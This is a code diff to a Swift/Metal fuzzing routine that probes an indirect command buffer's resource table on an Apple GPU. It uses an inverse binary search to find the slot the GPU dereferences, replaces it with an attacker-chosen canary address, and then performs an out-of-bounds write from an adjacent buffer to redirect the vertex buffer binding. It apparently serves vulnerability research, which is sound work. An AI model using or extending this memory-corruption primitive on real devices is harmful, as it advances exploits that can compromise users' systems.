@@ -2806,7 +2806,9 @@ func runICBFieldProbe(log: FuzzLog, completion: @escaping () -> Void) {
         let sl = SyncLog()
         func step(_ s: String) { sl.write(s); log.append(s) }
 
-        step("── ICB Field Offset Probe (binary search) ──")
+        step("── ICB Resource Table Probe (inverse binary search) ──")
+        // hi is all zeros by default → GPU reads null VAs from resource table → fault
+        // Inverse probe: fill hi with sentinelBuf VA to find which slots need valid VAs
         guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
         guard let queue  = device.makeCommandQueue()       else { step("✗ no queue");  completion(); return }
 
@@ -2819,7 +2821,8 @@ func runICBFieldProbe(log: FuzzLog, completion: @escaping () -> Void) {
         }
         sentinelBuf.contents().initializeMemory(as: UInt8.self, repeating: 0xBB, count: BUF_LEN)
         targetBuf.contents().initializeMemory(as: UInt8.self,   repeating: 0xCC, count: BUF_LEN)
-        step("sentinelBuf gpuVA=0x\(String(sentinelBuf.gpuAddress,radix:16))")
+        let sentVA = sentinelBuf.gpuAddress
+        step("sentinelBuf gpuVA=0x\(String(sentVA,radix:16))")
 
         let src = """
         #include <metal_stdlib>
@@ -2875,16 +2878,17 @@ func runICBFieldProbe(log: FuzzLog, completion: @escaping () -> Void) {
 
         let q = hi.contents().assumingMemoryBound(to: UInt8.self)
 
-        // Helper: write canaryVA to hi[from..<to] (8B aligned range)
-        func fillHi(_ from: Int, _ to: Int) {
-            var off = from; while off < to { for bi in 0..<8 { q[off+bi] = UInt8((canaryVA >> (bi*8)) & 0xFF) }; off += 8 }
+        // Helper: fill hi[from..<to] with a given UInt64 (8B aligned)
+        func fillHiVal(_ from: Int, _ to: Int, val: UInt64) {
+            var off = from
+            while off < to {
+                for bi in 0..<8 { q[off+bi] = UInt8((val >> (bi*8)) & 0xFF) }
+                off += 8
+            }
         }
-        // Helper: clear hi[from..<to]
-        func clearHi(_ from: Int, _ to: Int) {
-            var off = from; while off < to { for bi in 0..<8 { q[off+bi] = 0 }; off += 8 }
-        }
+        func fillHiSentinel(_ from: Int, _ to: Int) { fillHiVal(from, to, val: sentVA) }
+        func clearHi(_ from: Int, _ to: Int)        { fillHiVal(from, to, val: 0) }
 
-        // Helper: make a 1x1 render pass descriptor
         func makeRTDesc() -> MTLRenderPassDescriptor? {
             let td = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .bgra8Unorm,
                                                               width: 1, height: 1, mipmapped: false)
@@ -2897,7 +2901,6 @@ func runICBFieldProbe(log: FuzzLog, completion: @escaping () -> Void) {
             return rt
         }
 
-        // Helper: execute ICB, return true if GPU faulted
         func probeExec() -> Bool {
             guard let rtDesc = makeRTDesc(),
                   let cb  = queue.makeCommandBuffer(),
@@ -2908,71 +2911,99 @@ func runICBFieldProbe(log: FuzzLog, completion: @escaping () -> Void) {
             return cb.error != nil
         }
 
-        // Sanity: baseline (hi = zeros) — should NOT fault
+        // Baseline: hi=zeros — we now know this FAULTS (null deref)
         step("── baseline (hi=zeros) ──")
         let baselineFault = probeExec()
-        step("  baseline: \(baselineFault ? "FAULT (unexpected)" : "OK — zeros are safe")")
-        if baselineFault {
-            step("  ✗ zeros in hi also fault — probe invalid, aborting")
-            completion(); return
-        }
+        step("  result: \(baselineFault ? "FAULT — hi IS resource table (null VAs derefed)" : "OK — zeros safe")")
 
-        // Verify full-flood still faults (confirm primitive is live)
-        step("── full-flood verify ──")
-        fillHi(0, BUF_LEN)
-        let fullFault = probeExec()
-        clearHi(0, BUF_LEN)
-        step("  full flood: \(fullFault ? "FAULT ✓ — primitive confirmed" : "OK (no fault?!)")")
-        if !fullFault {
-            step("  ✗ full flood no longer faults — GPU layout changed, aborting")
-            completion(); return
-        }
+        // Phase A: fill ALL of hi with sentinelBuf VA — does ICB execute clean?
+        step("── phase A: fill hi with sentVA=0x\(String(sentVA,radix:16)) ──")
+        fillHiSentinel(0, BUF_LEN)
+        let sentFullFault = probeExec()
+        step("  result: \(sentFullFault ? "FAULT — sentVA alone insufficient (PSO VA also needed)" : "SUCCESS ✓ — sentVA satisfies resource table")")
 
-        // Binary search: narrow to exact 8-byte slot
-        step("── binary search ──")
-        var searchLo = 0
-        var searchHi = BUF_LEN
-        var iteration = 0
-        while searchHi - searchLo > 8 {
-            iteration += 1
-            let mid = ((searchLo + searchHi) / 2) & ~7  // align to 8
-            // Test lower half [searchLo, mid)
-            fillHi(searchLo, mid)
-            let loFault = probeExec()
-            clearHi(searchLo, mid)
-            step("  iter \(iteration): [0x\(String(format:"%x",searchLo))..0x\(String(format:"%x",mid))) → \(loFault ? "FAULT" : "ok")")
-            if loFault {
-                searchHi = mid
-            } else {
-                searchLo = mid
+        if !sentFullFault {
+            // Inverse binary search: start from all-filled, zero sections until fault returns
+            // The section that causes fault when zeroed = required field
+            step("── phase B: inverse binary search (zero sections, find required fields) ──")
+            // hi currently = all zeros (cleared after phase A)
+            clearHi(0, BUF_LEN)
+            // Re-fill all to start
+            fillHiSentinel(0, BUF_LEN)
+
+            var searchLo = 0
+            var searchHi2 = BUF_LEN
+            var iteration = 0
+            // narrow down: zero lower half, check if fault returns
+            while searchHi2 - searchLo > 8 {
+                iteration += 1
+                let mid = ((searchLo + searchHi2) / 2) & ~7
+                // Zero lower half, keep upper half filled
+                clearHi(searchLo, mid)
+                let faultAfterClear = probeExec()
+                step("  iter \(iteration): zero [0x\(String(format:"%x",searchLo))..0x\(String(format:"%x",mid))) → \(faultAfterClear ? "FAULT (required field in this range)" : "ok (not here)")")
+                if faultAfterClear {
+                    // Required field is in [searchLo, mid) — restore it, narrow
+                    fillHiSentinel(searchLo, mid)
+                    searchHi2 = mid
+                } else {
+                    // Required field is in [mid, searchHi2) — keep lower zeroed
+                    searchLo = mid
+                }
+                if iteration > 20 { step("  ✗ too many iterations"); break }
             }
-            if iteration > 20 { step("  ✗ too many iterations — aborting"); break }
+
+            let reqOff = searchLo
+            step("── result ──")
+            step("✓ required resource table field @ hi[+0x\(String(format:"%x",reqOff))]")
+            step("  GPU VA of field: 0x\(String(hi.gpuAddress + UInt64(reqOff), radix:16))")
+            step("  field must contain: sentVA=0x\(String(sentVA,radix:16)) (vertex buffer binding)")
+
+            // Confirm: zero only that 8B slot → fault returns
+            clearHi(0, BUF_LEN)
+            fillHiSentinel(0, BUF_LEN)
+            clearHi(reqOff, reqOff + 8)
+            let confirmFault = probeExec()
+            step("  zero single slot +0x\(String(format:"%x",reqOff)): \(confirmFault ? "FAULT ✓ confirmed" : "ok (check range)")")
+
+            // Restore, replace that slot with canaryVA → controlled fault
+            fillHiSentinel(0, BUF_LEN)
+            fillHiVal(reqOff, reqOff + 8, val: canaryVA)
+            let canaryFault = probeExec()
+            step("  replace slot with canaryVA=0x\(String(canaryVA,radix:16)): \(canaryFault ? "FAULT ✓ GPU derefed our VA" : "ok")")
+
+            // Clean up
+            clearHi(0, BUF_LEN)
+
+            // OOB via lo adjacency at the confirmed offset
+            step("── OOB via lo adjacency at confirmed field ──")
+            fillHiSentinel(0, BUF_LEN)  // restore table to working state
+            let p = lo.contents().assumingMemoryBound(to: UInt8.self)
+            for bi in 0..<8 { p[BUF_LEN + reqOff + bi] = UInt8((canaryVA >> (bi*8)) & 0xFF) }
+            step("  OOB[lo+0x\(String(format:"%x",BUF_LEN+reqOff))] ← canaryVA")
+            let oobFault = probeExec()
+            step("  OOB exec: \(oobFault ? "FAULT ✓ — OOB vtxBuf redirect confirmed" : "ok")")
+            clearHi(0, BUF_LEN)
+
+        } else {
+            // sentVA alone not enough — need PSO VA too
+            // Dump hi[0..255] to find structure clues after full-fill+execute
+            step("── phase B: PSO VA needed — dumping hi after full-sentinel fill ──")
+            step("  (hi was filled with sentVA, ICB faulted — dump first 256 bytes of hi for structure)")
+            fillHiSentinel(0, BUF_LEN)
+            // re-execute to let driver write anything into hi during submission
+            let _ = probeExec()
+            step("── hi[0..255] after execute (driver may have written resource VAs) ──")
+            for row in 0..<16 {
+                let base = row * 16
+                var hexStr = ""
+                for i in 0..<16 { hexStr += String(format: "%02x ", q[base + i]) }
+                step("  [+0x\(String(format: "%03x", base))]: \(hexStr)")
+            }
+            step("  → look for non-sentVA 8-byte patterns — those are PSO/other resource VAs")
+            step("  → next: fill hi with discovered PSO VA + sentVA at vtxBuf offset")
+            clearHi(0, BUF_LEN)
         }
-
-        let foundOff = searchLo
-        step("── result ──")
-        step("✓ active GPU field @ hi[+0x\(String(format:"%x",foundOff))] (hi gpuVA=0x\(String(hi.gpuAddress,radix:16))+0x\(String(format:"%x",foundOff)))")
-        step("  absolute GPU VA read by GPU: 0x\(String(hi.gpuAddress + UInt64(foundOff),radix:16))")
-
-        // Confirm: single 8-byte write at foundOff faults
-        fillHi(foundOff, foundOff + 8)
-        let singleFault = probeExec()
-        clearHi(foundOff, foundOff + 8)
-        step("  single 8B @ +0x\(String(format:"%x",foundOff)): \(singleFault ? "FAULT ✓ confirmed" : "ok (probe mismatch?)")")
-
-        // Dump 16 bytes around the found field for structure context
-        step("  hi[+0x\(String(format:"%x",max(0,foundOff-8)))..+0x\(String(format:"%x",min(BUF_LEN,foundOff+16)))] (baseline zeros context):")
-        var ctxHex = ""
-        for i in max(0, foundOff - 8)..<min(BUF_LEN, foundOff + 16) { ctxHex += String(format: "%02x ", q[i]) }
-        step("  \(ctxHex)")
-
-        // OOB write via lo adjacency demonstration at the confirmed offset
-        step("── OOB via lo adjacency at confirmed field ──")
-        let p = lo.contents().assumingMemoryBound(to: UInt8.self)
-        for bi in 0..<8 { p[BUF_LEN + foundOff + bi] = UInt8((canaryVA >> (bi*8)) & 0xFF) }
-        step("  OOB[lo+0x\(String(format:"%x",BUF_LEN+foundOff))] ← canaryVA=0x\(String(canaryVA,radix:16))")
-        let oobFault = probeExec()
-        step("  OOB exec: \(oobFault ? "FAULT ✓ — OOB-to-GPU-field confirmed" : "ok")")
 
         step("── ICB Field Probe complete ──────────────")
         completion()
